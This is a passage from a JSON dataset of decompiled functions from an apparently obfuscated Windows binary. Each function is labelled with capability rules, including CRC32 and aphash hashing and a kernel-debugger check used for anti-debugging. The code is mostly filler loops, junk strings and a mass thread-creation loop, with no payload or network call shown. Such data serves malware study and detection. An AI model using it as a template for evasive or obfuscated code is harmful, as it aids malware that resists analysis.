0x15; 0 < iStack332; iStack332 = iStack332 + -1) {\n        }\n    }\n    for (iStack336 = 0x5b; 0 < iStack336; iStack336 = iStack336 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0x76d6;\n}\n",
        "token_count": 1462
    },
    "0040170d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040170d(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t *in_ECX;\n    \n    if (((*(*in_ECX + 0xc) >> 0xc & 1) == 0) || (*(*in_ECX + 4) != 0)) {\n        uVar1 = fcn.0040437c(arg_8h, *in_ECX);\n        uVar1 = uVar1 & 0xffffff00 | uVar1 != -1;\n    }\n    else {\n        uVar1 = CONCAT31(*in_ECX >> 8, 1);\n    }\n    return uVar1;\n}\n",
        "token_count": 153
    },
    "0040174e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.0040174e(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_80h;\n    uint var_7ch;\n    int32_t var_78h;\n    uint var_74h;\n    uint var_5ch;\n    uchar var_41h;\n    uint var_40h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffff70;\n    var_14h = 0x44ffc0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_24h = 0x24e;\n    var_28h = 0x341;\n    var_10h = 1;\n    fcn.00401e79(\"blcalaudsbyofxljqfmljmjwruxhiisdpsmbxwztaqrnaduahnwbbjloncvabosmanpfnmdtwesmfvjlvcpiowsgqh\");\n    var_41h = 0;\n    var_10h = 2;\n    fcn.00401e79(\"blcalaudsbyofxljqfmljmjwruxhiisdpsmbxwztaqrnaduahnwbbjloncvabosmanpfnmdtwesmfvjlvcpiowsgqh\");\n    var_10h = 3;\n    fcn.00401e79(\"blcalaudsbyofxljqfmljmjwruxhiisdpsmbxwztaqrnaduahnwbbjloncvabosmanpfnmdtwesmfvjlvcpiowsgqh\");\n    uVar1 = fcn.00405b37(&var_74h, &var_5ch);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_78h = 0x4b; 0 < var_78h; var_78h = var_78h + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return *0x546994;\n}\n",
        "token_count": 562
    },
    "004017c6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint8_t __fastcall fcn.004017c6(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return *(param_1 + 4) & 1;\n}\n",
        "token_count": 44
    },
    "004017e4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004017e4(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack200;\n    uchar auStack196 [24];\n    uchar auStack172 [24];\n    int32_t iStack148;\n    uint uStack120;\n    int32_t iStack116;\n    int32_t iStack112;\n    uint uStack108;\n    uint uStack56;\n    uint uStack52;\n    uchar uStack41;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff08;\n    uStack28 = 0x417fd0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack41 = 1;\n    uStack52 = 0x40e68900;\n    uStack56 = 0;\n    uStack24 = 1;\n    fcn.00401e79(\"rhlziwbosnrnmtycfblmzuzkgwyqofli\");\n    uStack24 = 2;\n    fcn.00401e79(\"etlipus\");\n    iStack112 = 0x786;\n    for (iStack116 = 0; uStack24 = 3,  iStack116 < 0x5fbf; iStack116 = iStack116 + 1) {\n        (*_sym.imp.KERNEL32.dll_IsProcessorFeaturePresent)(5);\n        uStack108 = fcn.00401596(iStack112 << 2);\n        (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, 0x403215);\n    }\n    uStack120 = 0x17e0;\n    fcn.00401e79(\"ldtqqfyhmrwabkxcubbqcigrembqjfuangcpceydmbbxzqdbxhoplfsewhhrpgicrwvof\");\n    for (iStack148 = 0x13; 0 < iStack148; iStack148 = iStack148 + -1) {\n    }\n    uStack24 = 4;\n    fcn.00401e79(\"ldtqqfyhmrwabkxcubbqcigrembqjfuangcpceydmbbxzqdbxhoplfsewhhrpgicrwvof\");\n    uStack24 = 5;\n    fcn.00401e79(\"ldtqqfyhmrwabkxcubbqcigrembqjfuangcpceydmbbxzqdbxhoplfsewhhrpgicrwvof\");\n    uVar1 = fcn.00405b37(auStack196, auStack172);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack200 = 3; 0 < iStack200; iStack200 = iStack200 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return;\n}\n",
        "token_count": 752
    },
    "00401857": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401857(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_70h;\n    int32_t var_6ch;\n    uint var_68h;\n    uint var_50h;\n    uint var_38h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffff80;\n    var_14h = 0x4502e0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 0;\n    fcn.00401e79(\"rmyoioeuahtqnpruvmcrkkyiynypxdguxvscwoynkrxgyjafxpsheedgnlpxkewzlneintngo\");\n    var_10h = 1;\n    fcn.00401e79(\"rmyoioeuahtqnpruvmcrkkyiynypxdguxvscwoynkrxgyjafxpsheedgnlpxkewzlneintngo\");\n    var_10h = 2;\n    fcn.00401e79(\"rmyoioeuahtqnpruvmcrkkyiynypxdguxvscwoynkrxgyjafxpsheedgnlpxkewzlneintngo\");\n    uVar1 = fcn.00405b37(&var_68h, &var_50h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_6ch = 0x23; 0 < var_6ch; var_6ch = var_6ch + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 465
    },
    "00401866": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00401866(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iStack44;\n    int32_t iStack40;\n    \n    for (iStack40 = 0x4c; 0 < iStack40; iStack40 = iStack40 + -1) {\n    }\n    for (iStack44 = 0x3a; 0 < iStack44; iStack44 = iStack44 + -1) {\n    }\n    return CONCAT44(arg_8h, 1);\n}\n",
        "token_count": 119
    },
    "0040187a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.0040187a(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack224;\n    uchar auStack220 [24];\n    uchar auStack196 [24];\n    int32_t iStack172;\n    uchar auStack168 [24];\n    uchar auStack144 [24];\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uchar uStack106;\n    uchar uStack105;\n    uint uStack104;\n    uchar uStack97;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff00;\n    uStack28 = 0x451140;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x40ee9e80;\n    uStack48 = 0;\n    uStack24 = 1;\n    fcn.00401e79(\"mbvgczqozbfkfbfpghzrnamldqcsokygstsvdqanqgwlfjquojlzapoqolo\");\n    uStack24 = 2;\n    fcn.00401e79(\"juppntqpqgenxilpuytwhnwhtnbcvcxjtoywbdowqwhipptkqidlcipch\");\n    uStack97 = 0;\n    uStack104 = 0x77d;\n    uStack105 = 0;\n    uStack106 = 0;\n    uStack112 = 0x596;\n    uStack116 = 0x40ea3b00;\n    uStack120 = 0;\n    uStack24 = 3;\n    fcn.00401e79(\"juppntqpqgenxilpuytwhnwhtnbcvcxjtoywbdowqwhipptkqidlcipch\");\n    uStack24 = 5;\n    fcn.00401e79(\"juppntqpqgenxilpuytwhnwhtnbcvcxjtoywbdowqwhipptkqidlcipch\");\n    uVar1 = fcn.004042dc(auStack168, auStack144);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack172 = 0x42; 0 < iStack172; iStack172 = iStack172 + -1) {\n        }\n    }\n    uStack24 = 3;\n    fcn.00401e79(\"mbvgczqozbfkfbfpghzrnamldqcsokygstsvdqanqgwlfjquojlzapoqolo\");\n    uStack24 = 4;\n    fcn.00401e79(\"mbvgczqozbfkfbfpghzrnamldqcsokygstsvdqanqgwlfjquojlzapoqolo\");\n    uVar1 = fcn.00405b37(auStack220, auStack196);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack224 = 0x41; 0 < iStack224; iStack224 = iStack224 + -1) {\n        }\n    }\n    uStack24 = 3;\n    fcn.00401e79(\"zdpkuq\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 885
    },
    "0040196a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.0040196a(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    if ((arg_8h & 4) != 0) {\n        return 1;\n    }\n    if ((arg_8h & 1) == 0) {\n        return 0;\n    }\n    if ((arg_8h & 2) == 0) {\n        if (arg_ch < 0x80000000) {\n            return 0;\n        }\n    }\n    else if (arg_ch < 0x80000001) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 139
    },
    "004019b5": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.004019b5(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x4507a0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 1;\n    fcn.00401e79(\"crtjymlpnbmwxnxgydcwkjvjsgtwbrvivzmhrbogkvrtsqfggwjosjxxpbpoofepsqzmaibwsigyl\");\n    uStack24 = 2;\n    fcn.00401e79(\"zwdumrsnxe\");\n    uStack24 = 3;\n    fcn.00401e79(\"fswwyeffzxetfflbcnllwzubkkgcwbmdohqwkrjesgdcrrsyttcfasyjnflajphtw\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 1;\n}\n",
        "token_count": 303
    },
    "004019f1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004019f1(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iStack40;\n    int32_t iStack36;\n    \n    for (iStack36 = 0x18; 0 < iStack36; iStack36 = iStack36 + -1) {\n    }\n    for (iStack40 = 0x54; 0 < iStack40; iStack40 = iStack40 + -1) {\n    }\n    fcn.00401e79(\"jlersiekreqxu\");\n    return arg_8h;\n}\n",
        "token_count": 135
    },
    "00401a5a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nulong __cdecl\nfcn.00401a5a(uint arg_8h, uint noname_1, uint arg_10h, uint noname_3, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint noname_7, uint arg_28h)\n\n{\n    int32_t iStack68;\n    \n    for (iStack68 = 0x29; 0 < iStack68; iStack68 = iStack68 + -1) {\n    }\n    return CONCAT44(arg_18h, 0x1292);\n}\n",
        "token_count": 127
    },
    "00401b31": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401b31(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack128;\n    uchar auStack124 [24];\n    uchar auStack100 [24];\n    int32_t iStack76;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff58;\n    uStack28 = 0x450c00;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x40d3c000;\n    uStack48 = 0;\n    uStack24 = 3;\n    fcn.00401e79(\"tufzjpetxbgpjwfeefcrarrwrehplfzaajopcxxsmxanwhnxspsijpapmssvgttvjdmmtkqlrlstysifksfseydyscb\");\n    for (iStack76 = 0x19; 0 < iStack76; iStack76 = iStack76 + -1) {\n    }\n    uStack24 = 4;\n    fcn.00401e79(\"tufzjpetxbgpjwfeefcrarrwrehplfzaajopcxxsmxanwhnxspsijpapmssvgttvjdmmtkqlrlstysifksfseydyscb\");\n    uStack24 = 5;\n    fcn.00401e79(\"tufzjpetxbgpjwfeefcrarrwrehplfzaajopcxxsmxanwhnxspsijpapmssvgttvjdmmtkqlrlstysifksfseydyscb\");\n    uVar1 = fcn.00405b37(auStack124, auStack100);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack128 = 0x38; 0 < iStack128; iStack128 = iStack128 + -1) {\n        }\n    }\n    uStack24 = 4;\n    fcn.00401e79(\"fgblqtdlnn\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 624
    },
    "00401bd6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00401bd6(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return 7 < *(param_1 + 0x14);\n}\n",
        "token_count": 43
    },
    "00401bea": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401bea(uint arg_8h)\n\n{\n    uint var_4h;\n    \n    fcn.00403b02();\n    return 1;\n}\n",
        "token_count": 41
    },
    "00401c44": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401c44(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h)\n\n{\n    fcn.00401e79(\"zskqdfooymbxwqyfwcgirayfyqrrhygctpvxsvcquekkwbxssidsscjrelbyxouoxlyifnaazduswdtvgqxccslxixucbzxpnsgf\")\n    ;\n    fcn.00403b02();\n    return 0x5440;\n}\n",
        "token_count": 124
    },
    "00401c6c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00401c6c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack180;\n    int32_t iStack176;\n    uchar auStack172 [24];\n    uchar auStack148 [24];\n    int32_t iStack124;\n    ulong uStack120;\n    ulong uStack112;\n    ulong uStack104;\n    uchar uStack89;\n    uint uStack88;\n    uchar uStack81;\n    uint uStack80;\n    uint uStack76;\n    uchar uStack45;\n    uint8_t uStack37;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff38;\n    uStack24 = 0xffffffff;\n    uStack28 = 0x44fe80;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack37 = arg_8h & 1;\n    uStack45 = 0;\n    fcn.00401e79(\"jybkvhsqfrdxqeoafiakdqlxvypdzpazpldy\");\n    uStack76 = 0x51;\n    uStack80 = 0xff9;\n    uStack81 = 1;\n    uStack88 = 0x67d;\n    uStack89 = 0;\n    uStack104 = *0x546828;\n    uStack112 = *0x546818;\n    uStack120 = *0x546808;\n    for (iStack124 = 0x3b; 0 < iStack124; iStack124 = iStack124 + -1) {\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"jybkvhsqfrdxqeoafiakdqlxvypdzpazpldy\");\n    uStack24 = 1;\n    fcn.00401e79(\"jybkvhsqfrdxqeoafiakdqlxvypdzpazpldy\");\n    uVar1 = fcn.00405b37(auStack172, auStack148);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack176 = 0x5b; 0 < iStack176; iStack176 = iStack176 + -1) {\n        }\n    }\n    for (iStack180 = 1; 0 < iStack180; iStack180 = iStack180 + -1) {\n    }\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 1;\n}\n",
        "token_count": 654
    },
    "00401c71": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 __cdecl fcn.00401c71(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack192;\n    uchar auStack188 [24];\n    uchar auStack164 [24];\n    int32_t iStack140;\n    int32_t iStack136;\n    uchar auStack132 [24];\n    uchar auStack108 [24];\n    int32_t iStack84;\n    ulong uStack80;\n    ulong uStack72;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff28;\n    uStack28 = 0x451460;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 0;\n    fcn.00401e79(\"fcrmkswxqigbltcdsssdupipndt\");\n    uStack72 = *0x547348;\n    uStack80 = *0x547338;\n    for (iStack84 = 5; 0 < iStack84; iStack84 = iStack84 + -1) {\n    }\n    uStack24 = 1;\n    fcn.00401e79(\"fcrmkswxqigbltcdsssdupipndt\");\n    uStack24 = 3;\n    fcn.00401e79(\"fcrmkswxqigbltcdsssdupipndt\");\n    uVar1 = fcn.004042dc(auStack132, auStack108);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack136 = 0x4f; 0 < iStack136; iStack136 = iStack136 + -1) {\n        }\n    }\n    for (iStack140 = 0x53; 0 < iStack140; iStack140 = iStack140 + -1) {\n    }\n    uStack24 = 1;\n    fcn.00401e79(\"fcrmkswxqigbltcdsssdupipndt\");\n    uStack24 = 2;\n    fcn.00401e79(\"fcrmkswxqigbltcdsssdupipndt\");\n    uVar1 = fcn.00405b37(auStack188, auStack164);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack192 = 0x15; 0 < iStack192; iStack192 = iStack192 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return *0x547364;\n}\n",
        "token_count": 674
    },
    "00401c85": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00401c85(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack136;\n    int32_t iStack132;\n    uchar auStack128 [24];\n    uchar auStack104 [48];\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff60;\n    uStack28 = 0x4508e0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x40949400;\n    uStack48 = 0;\n    uStack52 = 0x40c2f600;\n    uStack56 = 0;\n    uStack24 = 0;\n    fcn.00401e79(\"bmckhrnmyirdqatnrbqozvnennhmqjqyoouguniwwawpryglmiuodoaqyzzjudqujhmykykdhgnwbdpf\");\n    uStack24 = 1;\n    fcn.00401e79(\"bmckhrnmyirdqatnrbqozvnennhmqjqyoouguniwwawpryglmiuodoaqyzzjudqujhmykykdhgnwbdpf\");\n    uStack24 = 2;\n    fcn.00401e79(\"bmckhrnmyirdqatnrbqozvnennhmqjqyoouguniwwawpryglmiuodoaqyzzjudqujhmykykdhgnwbdpf\");\n    uVar1 = fcn.004042dc(auStack128, auStack104);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack132 = 0x28; 0 < iStack132; iStack132 = iStack132 + -1) {\n        }\n    }\n    for (iStack136 = 0x4c; 0 < iStack136; iStack136 = iStack136 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0;\n}\n",
        "token_count": 565
    },
    "00401c8a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 __cdecl fcn.00401c8a(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack24 = 0xffffffff;\n    uStack28 = 0x418170;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    fcn.00401e79(\"heqtwxwetmiycyzrikhzqwpjcmasaflkbwicqaeivdecxsqubfppfvjdcbjhoglwbchfjqlnn\");\n    uStack24 = 0;\n    fcn.00401e79(\"kwtrzxocgrzdmnrpify\");\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return *0x4ec2a4;\n}\n",
        "token_count": 252
    },
    "00401ca3": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00401ca3(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack196;\n    uchar auStack192 [24];\n    uchar auStack168 [24];\n    uint uStack144;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uchar uStack81;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff20;\n    uStack24 = 0xffffffff;\n    uStack28 = 0x4517e0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    fcn.00401e79(\"friamyvdtsmonowaycmrkkxolzdmyxrofvnzsudrazzfvdhygbadboajhjlrprwivbixnafqupjlzssa\");\n    uStack68 = 0x40d6e700;\n    uStack72 = 0;\n    uStack76 = 0x40ea3780;\n    uStack80 = 0;\n    uStack81 = 1;\n    uStack92 = 0x40da2b40;\n    uStack96 = 0;\n    uStack100 = 0x40dd1880;\n    uStack104 = 0;\n    uStack108 = 0x40e45ce0;\n    uStack112 = 0;\n    uStack116 = 0x134e;\n    uStack24 = 0;\n    fcn.00401e79(\"ovbcmezyknpxulmvenpu\");\n    uStack144 = 0x1959;\n    uStack24 = 1;\n    fcn.00401e79(\"ovbcmezyknpxulmvenpu\");\n    uStack24 = 2;\n    fcn.00401e79(\"ovbcmezyknpxulmvenpu\");\n    uVar1 = fcn.004042dc(auStack192, auStack168);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack196 = 0x28; 0 < iStack196; iStack196 = iStack196 + -1) {\n        }\n    }\n    uStack24 = 1;\n    fcn.00401e79(\"konvnncuvtkdxxcpnuoi\");\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 667
    },
    "00401ca8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
